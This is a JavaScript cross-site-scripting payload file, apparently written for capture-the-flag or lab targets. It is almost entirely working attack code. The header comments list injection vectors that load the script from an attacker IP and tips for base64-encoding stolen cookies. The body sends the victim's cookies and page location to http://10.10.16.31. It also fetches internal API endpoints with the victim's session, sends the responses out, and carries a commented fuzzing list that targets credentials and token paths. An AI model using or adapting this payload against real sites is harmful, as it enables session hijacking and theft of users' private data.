// @manesec

// <img src="http://10.10.16.31/img" />
// <img src=x onerror="fetch('http://10.10.16.31/payload.js')" />
// <script src="http://10.10.16.31/payload.js"></script>

// Tips:
// eval(atob("base64_encode"))
// fetch("http://10.10.16.6/?" + btoa(document.cookie))

//<script> fetch("statistics.alert.htb", {method:'GET',mode:'no-cors',credentials:'same-origin'}).then(response => response.text()).then(text => { fetch('http://10.10.16.2/?=' + btoa(encodeURIComponent(text)) , {mode:'no-cors'}); }); </script>

const server = "http://10.10.16.31";

function send(d){ 
  try{
    fetch( server + "/?=" + (encodeURIComponent(d.toString())));
  }catch{} 
}

function sendb64(d){ 
    try{
        fetch( server + "/?=" + btoa(encodeURIComponent(d.toString())))
    }catch{} 
}

function fetchurl(url){
  fetch(
    url,
    {
      method: "GET",
      // credentials: 'include',
      // headers: {
      //   Accept: "application/json",
      //   "Content-Type": "application/json",
      //   Authorization: "Bearer eLrw3eXlljyFRjaul5UoYZLNgpUeapbXSFKmLc5SVaBgv8azUtoKn7B062PjbYoS",
      //   "User-Agent": "any-name"
      // }
    }
  )
  .then(response => {
    if (!response.ok) {
      send("error to fetch");
    }
    return response.text();
  })
  .then(data => {
    send( url + " => " + data.toString());
  })
  .catch(error => {
    send("error to fetch 2");
  });
}



send("Loading_script");

send("Cookie = " + document.cookie);
send("Windows Location = " + window.location.toString());

// single
fetchurl("/api/info")
fetchurl("/api/recent_messages")

// mult fuzzing
// var endpoints = ['access-token','account','accounts','amount','balance','balances','bar','baz','bio','bios','category','channel','chart','circular','company','content','contract','coordinate','credentials','creds','custom','customer','customers','details','dir','directory','dob','email','employee','event','favorite','feed','foo','form','github','gmail','group','history','image','info','item','job','link','links','location','log','login','logins','logs','map','member','members','messages','money','my','name','names','news','option','options','pass','password','passwords','phone','picture','pin','post','prod','production','profile','profiles','publication','record','sale','sales','set','setting','settings','setup','site','test','theme','token','tokens','twitter','union','url','user','username','users','vendor','vendors','version','website','work','yahoo'];
// for (i in endpoints){
//   fetchurl(i);
// }

send("Done");